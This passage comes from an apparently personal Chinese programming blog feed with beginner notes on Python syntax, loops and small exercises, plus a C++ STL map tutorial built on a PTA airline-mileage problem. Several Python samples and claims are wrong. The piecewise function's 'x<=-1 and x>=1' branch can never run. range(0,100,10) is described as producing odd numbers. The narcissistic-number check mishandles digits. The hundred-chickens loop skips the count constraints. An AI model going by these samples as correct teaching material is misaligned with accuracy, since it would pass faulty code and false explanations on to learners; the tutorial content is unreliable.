通过内置函数len计算字符串的长度</span></span><br><span class="line"><span class="builtin-name">print</span>(len(str1)) # 13</span><br><span class="line"><span class="comment"># 从字符串中查找子串所在位置</span></span><br><span class="line"><span class="builtin-name">print</span>(str1.<span class="builtin-name">find</span>(<span class="string">'or'</span>)) # 8</span><br><span class="line"><span class="builtin-name">print</span>(str1.<span class="builtin-name">find</span>(<span class="string">'shit'</span>)) # -1</span><br><span class="line"><span class="comment"># 与find类似但找不到子串时会引发异常</span></span><br><span class="line"><span class="builtin-name">print</span>(str1.startswith(<span class="string">'He'</span>)) # <span class="literal">False</span></span><br><span class="line"><span class="builtin-name">print</span>(str1.startswith(<span class="string">'hel'</span>)) # <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">list1 = [1, 3, 5, 7, 100]</span><br><span class="line"><span class="builtin-name">print</span>(list1) # [1, 3, 5, 7, 100]</span><br><span class="line"><span class="comment"># 乘号表示列表元素的重复</span></span><br><span class="line">list2 = [<span class="string">'hello'</span>] * 3</span><br><span class="line"><span class="builtin-name">print</span>(list2) # [<span class="string">'hello'</span>, <span class="string">'hello'</span>, <span class="string">'hello'</span>]</span><br><span class="line"><span class="comment"># 计算列表长度(元素个数)</span></span><br><span class="line"><span class="builtin-name">print</span>(len(list1)) # 5</span><br><span class="line"><span class="comment"># 下标(索引)运算</span></span><br><span class="line"><span class="builtin-name">print</span>(list1[-1]) # 100</span><br><span class="line"><span class="builtin-name">print</span>(list1[-3]) # 5</span><br><span class="line"><span class="comment"># 通过循环用下标遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(list1)):</span><br><span class="line">    <span class="builtin-name">print</span>(list1[index])</span><br><span class="line"><span class="comment"># 通过for循环遍历列表元素</span></span><br></pre></td></tr></table></figure><h2 id="【未完待续】"><a href="#【未完待续】" class="headerlink" title="【未完待续】"></a>【未完待续】</h2>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python系统学习笔记(一)</title>
      <link href="/2020/01/08/Python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
      <url>/2020/01/08/Python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>_<strong>首先因为学校没有开设Python这门课程,但是为了补充自己的知识，以及加快在未来遇到Python代码理解使用的速度，所以决定寒假系统的学习一下这门语言，以及自己尝试做一个小项目。预计用时一个半月，学习参考<a href="https://github.com/jackfrued/Python-100-Days" target="_blank" rel="noopener">Python100天</a>，能学到哪算哪，因为打过一段时间C++类的竞赛，以及开发过Java语言的项目，所以相信python学习速度会比不懂的人要快(自恋)，语言都是相通的嘛，最重要的是语法，还有一些别的语言没有的包。</strong></p><a id="more"></a><p>感谢<a href="https://github.com/jackfrued/Python-100-Days" target="_blank" rel="noopener">jackfrued大佬</a><br><b>版本为python3</b></p><h1 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h1><p>_<strong>注解：C&#x2F;C++、Java等语言不同，Python中没有用花括号来构造代码块而是使用了缩进的方式来设置代码的层次结构，如果if条件成立的情况下需要执行多条语句，只要保持多条语句具有相同的缩进就可以了，换句话说连续的代码如果又保持了相同的缩进那么它们属于同一个代码块，相当于是一个执行的整体。</strong></p><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><h3 id="if-和else"><a href="#if-和else" class="headerlink" title="if 和else"></a>if 和else</h3><ul><li>完成：利用if语句判断输入是否为自己想要<br><br><b>&amp;&amp;语句以及||，在python中为or、and(分辨大小写)</b></li></ul><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">username</span>=<span class="function"><span class="title">input</span>(<span class="string">"username:"</span>)</span></span><br><span class="line"><span class="variable">passoword</span>=<span class="function"><span class="title">input</span>(<span class="string">"password:"</span>)</span></span><br><span class="line"><span class="variable"><span class="keyword">if</span></span> <span class="variable">username</span>==<span class="string">'Chenzidu'</span> <span class="variable"><span class="keyword">or</span></span> <span class="variable">passoword</span>==<span class="string">"admin"</span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"yes"</span>)</span></span><br><span class="line"><span class="variable"><span class="keyword">else</span></span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"no"</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">username</span>=<span class="function"><span class="title">input</span>(<span class="string">"username:"</span>)</span></span><br><span class="line"><span class="variable">passoword</span>=<span class="function"><span class="title">input</span>(<span class="string">"password:"</span>)</span></span><br><span class="line"><span class="variable"><span class="keyword">if</span></span> <span class="variable">username</span>==<span class="string">'Chenzidu'</span> <span class="variable"><span class="keyword">and</span></span> <span class="variable">passoword</span>==<span class="string">"admin"</span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"yes"</span>)</span></span><br><span class="line"><span class="variable"><span class="keyword">else</span></span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"no"</span>)</span></span><br></pre></td></tr></table></figure><h3 id="elif"><a href="#elif" class="headerlink" title="elif"></a>elif</h3><p><b>elif相当于其他语言中的 else if </b></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">if</span> <span class="string">条件:</span></span><br><span class="line">    <span class="attr">语句块</span></span><br><span class="line"></span><br><span class="line"><span class="attr">elif</span> <span class="string">条件:</span></span><br><span class="line">    <span class="attr">语句块</span></span><br><span class="line"><span class="attr">else</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">语句块</span></span><br></pre></td></tr></table></figure><ul><li>完成：利用elif判断是管理员还是超级管理员，或者都不是</li></ul><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">username</span>=<span class="function"><span class="title">input</span>(<span class="string">"username:"</span>)</span></span><br><span class="line"><span class="variable">password</span>=<span class="function"><span class="title">input</span>(<span class="string">"password:"</span>)</span></span><br><span class="line"><span class="variable"><span class="keyword">if</span></span> <span class="variable">username</span> == <span class="string">'ChenZIDu'</span> <span class="variable"><span class="keyword">and</span></span> <span class="variable">password</span> == <span class="string">"admin"</span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"Hello! superAdmin"</span>)</span></span><br><span class="line"><span class="variable">elif</span> <span class="variable">username</span> == <span class="string">"ChenZIDu"</span> <span class="variable"><span class="keyword">or</span></span> <span class="variable">password</span> == <span class="string">"admin"</span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"admin"</span>)</span></span><br><span class="line"><span class="variable"><span class="keyword">else</span></span>:</span><br><span class="line">    <span class="function"><span class="title">print</span>(<span class="string">"You are not Admin"</span>)</span></span><br></pre></td></tr></table></figure><h3 id="完成：分段函数求值"><a href="#完成：分段函数求值" class="headerlink" title="完成：分段函数求值"></a>完成：分段函数求值</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        <span class="number">3</span>x<span class="number">-5</span> (x&gt;<span class="number">1</span>)</span><br><span class="line">f(x)=&#123;  x+<span class="number">2</span>  (<span class="number">-1</span>≤x≤<span class="number">1</span>)</span><br><span class="line">        <span class="number">5</span>x+<span class="number">3</span> (x&lt;<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><h4 id="保持print-中打印的值一致，比如说字符"><a href="#保持print-中打印的值一致，比如说字符" class="headerlink" title="保持print()中打印的值一致，比如说字符"></a>保持print()中打印的值一致，比如说字符</h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x</span> =int(input(<span class="string">"x="</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="symbol">x</span> &gt; <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"f(x)="</span>+ str(<span class="number">3</span> * <span class="symbol">x</span> <span class="number">-5</span>))</span><br><span class="line">elif <span class="symbol">x</span>&lt;=<span class="number">-1</span> <span class="keyword">and</span> <span class="symbol">x</span> &gt;= <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"f(x)="</span>+ str(<span class="symbol">x</span> + <span class="number">2</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"f(x)="</span>+ str(<span class="number">5</span> * <span class="symbol">x</span> + <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="symbol">x</span> =int(input(<span class="string">"x="</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="symbol">x</span> &gt; <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"f(x)=%d"</span>%(<span class="number">3</span> * <span class="symbol">x</span> <span class="number">-5</span>))</span><br><span class="line">elif <span class="symbol">x</span>&lt;=<span class="number">-1</span> <span class="keyword">and</span> <span class="symbol">x</span> &gt;= <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"f(x)=%d"</span>%(<span class="symbol">x</span> + <span class="number">2</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"f(x)=%d"</span>%(<span class="number">5</span> * <span class="symbol">x</span> + <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">以及</span><br><span class="line"></span><br><span class="line"><span class="symbol">x</span> =int(input(<span class="string">"x="</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="symbol">x</span> &gt; <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"f(x)="</span>,<span class="number">3</span> * <span class="symbol">x</span> <span class="number">-5</span>)</span><br><span class="line">elif <span class="symbol">x</span>&lt;=<span class="number">-1</span> <span class="keyword">and</span> <span class="symbol">x</span> &gt;= <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"f(x)="</span>,<span class="symbol">x</span> + <span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"f(x)="</span>,<span class="number">5</span> * <span class="symbol">x</span> + <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><em><strong>三种都可以但是输出结果不一致</strong></em></p><hr><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="for-循环语句"><a href="#for-循环语句" class="headerlink" title="for 循环语句"></a>for 循环语句</h3><p><b>for in range() </b></p><ul><li>完成输出N个数和</li></ul><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">for i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">sum</span>+=i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>range(101)可以用来构造一个从0到100的取值范围，这样就可以构造出一个整数的序列并用于循环中，例如：</p><ol><li>range(100)可以产生一个0到99的整数序列。</li><li>range(0,100)可以产生一个0到99的整数序列。</li><li>range(0,100,10)可以产生一个0到99的奇数序列，其中10是步长，即每次i增加10。</li></ol><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">for i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>,<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">sum</span>+=i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><h3 id="while-循环语句"><a href="#while-循环语句" class="headerlink" title="while 循环语句"></a>while 循环语句</h3><ul><li>完成输入N个数，判断是奇数还是偶数,如果为0退出</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a =int(input())</span><br><span class="line">    <span class="keyword">if</span> a % 2 == 1:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"奇数"</span>)</span><br><span class="line">    elif a%<span class="attribute">2</span>==0 <span class="keyword">and</span> a != 0:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"偶数"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h3 id="完成打印三角形"><a href="#完成打印三角形" class="headerlink" title="完成打印三角形"></a>完成打印三角形</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**</span></span><br><span class="line"><span class="comment">***</span></span><br><span class="line"><span class="comment">****</span></span><br><span class="line"><span class="comment">*****</span></span><br><span class="line"></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">  ***</span></span><br><span class="line"><span class="comment"> ****</span></span><br><span class="line"><span class="comment">*****</span></span><br><span class="line"></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">   ***</span></span><br><span class="line"><span class="comment">  *****</span></span><br><span class="line"><span class="comment"> *******</span></span><br><span class="line"><span class="comment">*********</span></span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">num</span>=int(input("输入行数："))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(i+1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span> , <span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(num):</span><br><span class="line">        <span class="keyword">if</span> j&lt;num - i -1:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">" "</span>,<span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"*"</span>,<span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(num-i-1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">" "</span>,<span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i * 2 +1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>,<span class="attribute">end</span>=<span class="string">""</span>)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h3><p><em><strong>水仙花数也被称为超完全数字不变数、自恋数、自幂数、阿姆斯特朗数，它是一个3位数，该数字每个位上数字的立方之和正好等于它本身，例如：$1^3 + 5^3+ 3^3&#x3D;153$。</strong></em></p><h4 id="完成：输入一个数字判断是否为水仙花数"><a href="#完成：输入一个数字判断是否为水仙花数" class="headerlink" title="完成：输入一个数字判断是否为水仙花数"></a>完成：输入一个数字判断是否为水仙花数</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">num</span> = int(input(<span class="string">"输入验证的水仙花数："</span>))</span><br><span class="line"><span class="built_in">log</span> = <span class="built_in">num</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">num</span> &gt;= <span class="number">9</span>:</span><br><span class="line">    t = <span class="built_in">num</span> % <span class="number">10</span></span><br><span class="line">    <span class="built_in">sum</span> += t ** <span class="number">3</span>     <span class="comment"># 表示t的三次方</span></span><br><span class="line">    <span class="built_in">num</span> = <span class="built_in">num</span><span class="comment"> // 10   # “//”表示整数除法，“/” 表示浮点数除法</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> += <span class="built_in">num</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span> == <span class="built_in">log</span>:</span><br><span class="line">    print(<span class="string">"yes"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"no"</span>)</span><br></pre></td></tr></table></figure><h3 id="百钱买鸡"><a href="#百钱买鸡" class="headerlink" title="百钱买鸡"></a>百钱买鸡</h3><p><em><strong>说明：百钱百鸡是我国古代数学家张丘建在《算经》一书中提出的数学问题：鸡翁一值钱五，鸡母一值钱三，鸡雏三值钱一。百钱买百鸡，问鸡翁、鸡母、鸡雏各几何？翻译成现代文是：公鸡5元一只，母鸡3元一只，小鸡1元三只，用100块钱买一百只鸡，问公鸡、母鸡、小鸡各有多少只？</strong></em></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">if</span> i*<span class="number">5</span> + j*<span class="number">3</span> &lt;=<span class="number">100</span>:</span><br><span class="line">            print(<span class="string">"公鸡：%d,母鸡：%d，小鸡：%d"</span> % (i,j,<span class="number">100</span><span class="number">-5</span>*i<span class="number">-3</span>*j))</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stl-Map容器简单使用</title>
      <link href="/2020/01/03/Stl-Map%E5%AE%B9%E5%99%A8%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/01/03/Stl-Map%E5%AE%B9%E5%99%A8%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="Map是STL的一个关联容器，它提供一对一-也就是一个键一个值-的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。map内部自建一颗红黑树（一种非严格意义上的平衡二叉树），这颗树具有对数据自动排序的功能，所以在map内部所有的数据都是有序的。"><a href="#Map是STL的一个关联容器，它提供一对一-也就是一个键一个值-的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。map内部自建一颗红黑树（一种非严格意义上的平衡二叉树），这颗树具有对数据自动排序的功能，所以在map内部所有的数据都是有序的。" class="headerlink" title="Map是STL的一个关联容器，它提供一对一(也就是一个键一个值)的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。map内部自建一颗红黑树（一种非严格意义上的平衡二叉树），这颗树具有对数据自动排序的功能，所以在map内部所有的数据都是有序的。"></a>Map是STL的一个关联容器，它提供一对一(也就是一个键一个值)的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。map内部自建一颗红黑树（一种非严格意义上的平衡二叉树），这颗树具有对数据自动排序的功能，所以在map内部所有的数据都是有序的。</h3><a id="more"></a><h2 id="C-中Map头文件"><a href="#C-中Map头文件" class="headerlink" title="C++中Map头文件"></a>C++中Map头文件</h2><p><code>#include&lt;map&gt;</code></p><h2 id="构建方法"><a href="#构建方法" class="headerlink" title="构建方法"></a>构建方法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; a;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; a;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; a;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; a;</span><br><span class="line">........等等</span><br></pre></td></tr></table></figure><h2 id="Map简单语句"><a href="#Map简单语句" class="headerlink" title="Map简单语句"></a>Map简单语句</h2><ul><li>begin()———返回指向map头部的迭代器</li><li>clear()———删除所有元素</li><li>count()———返回指定元素出现的次数</li><li>empty()———如果map为空则返回true</li><li>erase()———删除一个元素</li><li>find()———-查找一个元素</li><li>insert()——–插入元素</li><li>size()———-返回map中元素的个数</li></ul><h2 id="例题pta-航空公司VIP客户查询-25分"><a href="#例题pta-航空公司VIP客户查询-25分" class="headerlink" title="例题pta-航空公司VIP客户查询 (25分)"></a>例题<a href="https://pintia.cn/" target="_blank" rel="noopener">pta-航空公司VIP客户查询 (25分)</a></h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>不少航空公司都会提供优惠的会员服务，当某顾客飞行里程累积达到一定数量后，可以使用里程积分直接兑换奖励机票或奖励升舱等服务。现给定某航空公司全体会员的飞行记录，要求实现根据身份证号码快速查询会员里程积分的功能。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>输入首先给出两个正整数N(≤1e+05)和K(≤500)。其中K是最低里程，即为照顾乘坐短程航班的会员,航空公司还会将航程低于K公里的航班也按K公里累积。随后N行，每行给出一条飞行记录。飞行记录的输入格式为：18位身份证号码(空格)飞行里程。其中身份证号码由17位数字加最后一位校验码组成，校验码的取值范围为0~9和x共11个符号；飞行里程单位为公里，是(0,15000]区间内的整数。然后给出一个正整数M(≤1e+05)，随后给出M行查询人的身份证号码。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每个查询人，给出其当前的里程累积值。如果该人不是会员，则输出No Info。每个查询结果占一行。</p><h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">500</span></span><br><span class="line"><span class="symbol">330106199010080419 </span><span class="number">499</span></span><br><span class="line"><span class="symbol">110108198403100012 </span><span class="number">15000</span></span><br><span class="line"><span class="symbol">120104195510156021 </span><span class="number">800</span></span><br><span class="line"><span class="symbol">330106199010080419 </span><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">120104195510156021</span></span><br><span class="line"><span class="number">110108198403100012</span></span><br><span class="line"><span class="number">330106199010080419</span></span><br><span class="line"><span class="number">33010619901008041</span>x</span><br></pre></td></tr></table></figure><h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">800</span></span><br><span class="line"><span class="number">15000</span></span><br><span class="line"><span class="number">1000</span></span><br><span class="line"><span class="literal">No</span> <span class="string">Info</span></span><br></pre></td></tr></table></figure><p>标准的Map例题，将String的键，对应int的值，判断有无这个键，如果没有输出No Info，如果有判断是否大于最低，如果大于直接加如果小于加最低的。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span> ,<span class="keyword">int</span>&gt; a; </span><br><span class="line"><span class="keyword">int</span> n,m,l;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d"</span>,b,&amp;l);</span><br><span class="line"><span class="keyword">if</span>(l&gt;m)</span><br><span class="line">a[b]+=l;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[b]+=m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span 